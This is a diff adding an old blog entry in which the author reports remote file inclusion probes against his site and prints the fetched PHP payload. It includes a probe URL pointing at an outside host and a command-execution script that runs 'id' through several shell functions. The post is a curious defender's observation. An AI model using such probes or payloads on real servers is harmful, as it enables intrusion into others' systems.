@@ -1,0 +1,69 @@
+<?xml version='1.0' encoding='utf-8'?>
+<blog>
+<entry when='20080313T111220'>
+<title>The script kiddies that couldn't shoot straight</title>
+<category>malware</category>
+<category>php</category>
+<body>
+<p>One of the things I find entertaining about monitoring web sites is to see
+the trails of malware.  Yesterday, there were a few attempts to request pages
+from our site with a query parameter added on, for example:
+</p>
+
+<quote><code>blah/blah?p=http://www.mambembrincantes.com/site/safeon.txt??</code></quote>
+
+<p>I visited that odd URL to see what I could find out, and discovered a plain text
+file containing PHP code.  This is the code (formatted so I could read it):</p>
+
+<code lang='php'><![CDATA[
+<?php
+    echo "31337:";
+    $cmd = "id";
+    $eseguicmd = ex($cmd);
+    echo $eseguicmd;
+    function ex($cfe) {
+        $res = '';
+        if (!empty($cfe)) {
+            if (function_exists('exec')) {
+                @exec($cfe, $res);
+                $res = join("\n", $res);
+            }
+            elseif (function_exists('shell_exec')) {
+                $res = @shell_exec($cfe);
+            }
+            elseif (function_exists('system')) {
+                @ob_start();
+                @system($cfe);
+                $res = @ob_get_contents();
+                @ob_end_clean();
+            }
+            elseif (function_exists('passthru')) {
+                @ob_start();
+                @passthru($cfe);
+                $res = @ob_get_contents();
+                @ob_end_clean();
+            }
+            elseif (@is_resource($f = @popen($cfe, "r"))) {
+                $res = "";
+                while (!@feof($f)) {
+                    $res .= @fread($f, 1024);
+                }
+                @pclose($f);
+            }
+        }
+        return $res;
+    }
+    exit;
+?>
+]]></code>
+
+<p>I'm not sure what the heck is going on here.  The script looks like it's trying
+to accept a command and execute it, except the command is hardcoded to "id".
+And what good does it do to hit my server with this URL in a ?p= parameter?
+Is there some vulnerability somewhere so that a server sent this URL will fetch
+this PHP and execute it? Is this part of a server-based virus? What good does it
+do if the command is always "id"?  So many questions...</p>
+
+</body>
+</entry>
+</blog>
